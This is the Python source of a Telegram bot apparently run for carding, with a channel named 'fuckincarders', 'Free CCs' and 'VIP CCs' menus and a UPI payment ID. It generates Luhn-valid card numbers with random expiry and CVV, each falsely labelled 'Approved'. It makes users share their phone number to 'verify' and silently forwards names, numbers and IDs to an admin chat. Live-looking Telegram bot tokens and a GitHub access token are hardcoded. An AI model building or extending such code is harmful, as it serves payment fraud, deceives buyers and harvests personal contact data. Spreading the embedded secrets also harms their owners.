import random, json, io, logging, requests, asyncio
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ---------------- CONFIG ----------------
BOT_TOKEN = "8241360344:AAFP0_43PmJRCTa2mpv5F2q_XYixkRXTdYs"
ADMIN_BOT_TOKEN = "7636476146:AAFl2JDniUNsQYRFsU6BSHPVyS8sqQn0ejg"
ADMIN_CHAT_ID = 6800292901

GIST_ID_TXN = "426a9400569f40b6f4d664b74801a78a"
GITHUB_PAT = ("github_pat_11BQYPIPI0boMKyo1ZCgKa_LMmfMm9vac"
              "bpv1upw9PQ1mT7l2DQ3r24JDeTOOz1o5ePTEH7RT4RE861P9f")
HEADERS = {"Authorization": f"token {GITHUB_PAT}"}
GIST_URL_TXN = f"https://api.github.com/gists/{GIST_ID_TXN}"

JOIN_CHANNEL = "https://t.me/fuckincarders"
SUPPORT_LINK = "https://t.me/alone120122"
UPI_ID = "withonly.vinay@axl"

user_states = {}
verified_users = set()
joined_users = set()
last_statuses = {}

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ---------------- CC GENERATOR ----------------
class CCGenerator:
    BIN_DATA = {
        "4": {"brand": "Visa", "length": 16, "bank": "Chase", "country": "US"},
        "5": {"brand": "Mastercard", "length": 16, "bank": "Citi", "country": "US"},
        "3": {"brand": "Amex", "length": 15, "bank": "Amex Bank", "country": "US"}
    }

    def get_bin_info(self, bin_number):
        return self.BIN_DATA.get(bin_number[0], {"brand":"Unknown","length":16,"bank":"Unknown","country":"US"})

    def luhn_checksum(self, number):
        digits = [int(d) for d in str(number)]
        odd, even = digits[-1::-2], digits[-2::-2]
        checksum = sum(odd)
        for d in even: checksum += sum([int(x) for x in str(d*2)])
        return checksum % 10

    def calculate_luhn(self, partial):
        c = self.luhn_checksum(int(partial)*10)
        return 0 if c==0 else 10-c

    def generate_card(self, bin_number):
        info = self.get_bin_info(bin_number)
        length = info["length"]
        need = length - len(bin_number) - 1
        acc = "".join([str(random.randint(0,9)) for _ in range(need)])
        partial = bin_number + acc
        check = self.calculate_luhn(partial)
        card_number = partial + str(check)
        exp = f"{random.randint(1,12):02d}/{str(random.randint(25,30))}"
        cvv = str(random.randint(100,999)) if info["brand"]!="Amex" else str(random.randint(1000,9999))
        return (f"💳 CC: {card_number}|{exp}|{cvv}\n"
                f"🏦 Bank: {info['bank']}\n"
                f"🌍 Country: {info['country']}\n"
                f"💠 Brand: {info['brand']}\n"
                f"📌 BIN: {bin_number}\n"
                f"✅ Status: Approved\n")

generator = CCGenerator()

# ---------------- TRANSACTIONS ----------------
def load_transactions():
    try:
        r = requests.get(GIST_URL_TXN, headers=HEADERS).json()
        files = r.get("files", {})
        content = files.get("transactions.json", {}).get("content", "{}")
        return json.loads(content)
    except:
        return {}

def save_transactions(data):
    payload = {"files": {"transactions.json":{"content": json.dumps(data, indent=2)}}}
    requests.patch(GIST_URL_TXN, headers=HEADERS, json=payload)

# ---------------- VERIFICATION ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in joined_users:
        keyboard = [[InlineKeyboardButton("✅ I have joined", callback_data="joined_channel")]]
        await update.message.reply_text(
            f"🚨 Please join our channel first:\n{JOIN_CHANNEL}",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return
    if user_id not in verified_users:
        keyboard = [[InlineKeyboardButton("Verify", callback_data="verify_user")]]
        await update.message.reply_text("🔒 Please verify your account to continue:",
                                        reply_markup=InlineKeyboardMarkup(keyboard))
        return
    await send_dashboard(update, context)

async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == "joined_channel":
        joined_users.add(user_id)
        keyboard = [[InlineKeyboardButton("Verify", callback_data="verify_user")]]
        await query.message.reply_text("🔒 Please verify your account to continue:",
                                       reply_markup=InlineKeyboardMarkup(keyboard))
        return

    if query.data == "verify_user":
        button = [[KeyboardButton("📱 Share Contact", request_contact=True)]]
        await query.message.reply_text("📲 Please share your phone number to verify:",
                                       reply_markup=ReplyKeyboardMarkup(button, one_time_keyboard=True, resize_keyboard=True))
        return

async def handle_contact(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    contact = update.message.contact
    if not contact:
        return
    verified_users.add(user.id)

    details = (f"👤 Name: {user.full_name}\n"
               f"📱 Number: {contact.phone_number}\n"
               f"🆔 User ID: {user.id}")

    try:
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={"chat_id": ADMIN_CHAT_ID, "text": details}
        )
    except Exception as e:
        logger.error(f"Admin notify failed: {e}")

    await update.message.reply_text("✅ Verification successful!",
                                    reply_markup=ReplyKeyboardMarkup([["🏠 Dashboard"]], resize_keyboard=True))
    await send_dashboard(update, context)

# ---------------- DASHBOARD ----------------
async def send_dashboard(update, context):
    keyboard = [
        [InlineKeyboardButton("💳 Free CCs", callback_data="free_cc")],
        [InlineKeyboardButton("⚡ CC-GEN", callback_data="ccgen")],
        [InlineKeyboardButton("🌟 VIP CCs", callback_data="vip_menu")]
    ]
    if hasattr(update, "callback_query"):
        await update.callback_query.message.reply_text("🏠 Dashboard:",
                                                       reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.message.reply_text("🏠 Dashboard:",
                                        reply_markup=InlineKeyboardMarkup(keyboard))

# ---------------- BACKGROUND NOTIFIER ----------------
async def notifier(app: Application):
    global last_statuses
    while True:
        txns = load_transactions()
        for tid, info in txns.items():
            uid = info.get("user_id")
            status = info.get("status")
            if not uid: continue
            if last_statuses.get(tid) != status and status in ["approved","rejected"]:
                try:
                    await app.bot.send_message(
                        uid,
                        f"🔔 Your transaction `{tid}` has been **{status.upper()}**.",
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"Notify failed: {e}")
            last_statuses[tid] = status
        await asyncio.sleep(60)

# ---------------- MAIN ----------------
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("Dashboard", send_dashboard))
    app.add_handler(CallbackQueryHandler(handle_buttons))
    app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
    asyncio.create_task(notifier(app))
    app.run_polling()

if __name__ == "__main__":
    main()
